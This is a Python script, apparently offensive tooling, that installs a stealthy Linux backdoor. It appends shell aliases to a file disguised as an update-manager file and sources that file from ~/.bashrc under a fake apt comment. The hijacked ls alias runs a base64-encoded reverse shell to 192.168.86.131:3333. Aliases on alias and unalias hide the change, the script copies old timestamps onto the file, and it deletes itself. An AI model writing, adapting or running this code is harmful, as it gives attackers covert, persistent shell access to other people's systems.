# coding=utf-8
# !/usr/bin/env python
import subprocess
import sys,os
import base64


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def newfile(new_content):
    filename = "/etc/update-manager/release-update"
    with open(filename, 'a+') as file:
        file.write(new_content + '\n')


def newfile2():
    filename = os.path.expanduser("~/.bashrc")
    new_content = """
#enable software update with apt
#See /etc/apt/source.d/ in the apt package.
if [ -f /etc/update-manager/release-update ]; then
    . /etc/update-manager/release-update
fi  
    """
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def base64en():
    code = '''
import os
import socket
import subprocess
import sys

ret = os.fork()

if ret > 0:
    sys.exit()
else:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.86.131", 3333))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        sys.exit()
    '''
    encoded_code = base64.b64encode(code)
    return encoded_code

def checkkey():
    file_path = "/etc/update-manager/release-update"
    if os.path.exists(file_path):
        print("Yes----成功")
    else:
        print("No----失败")

def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除"+script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    # alias ls='alerts(){ ls $* --color=auto;执行的命令;};alerts'
    payload = base64en()
    newfile(
        """alias ls='alerts(){ ls $* --color=auto;python2 -c "import base64,sys;exec(base64.b64decode('\\''""" + payload + """'\\''))";};alerts'""")
    newfile(
        """alias unalias='alerts(){ if [ $# != 0 ]; then if [ $* != "ls" ]&&[ $* != "alias" ]&&[ $* != "unalias" ]; then unalias $*;else echo "-bash: unalias: ${*}: not found";fi;else echo "unalias: usage: unalias [-a] name [name ...]";fi;};alerts'""")
    newfile(
        """alias alias='alerts(){ alias "$@" | grep -v unalias | sed "s/alerts.*lambda.*/ls --color=auto'\\''/";};alerts'""")
    newfile2()
    ml('sudo touch -acmr /etc/update-manager/release-upgrades /etc/update-manager/release-update')
    checkkey()
    delete_current_script()  # 删除当前执行脚本文件
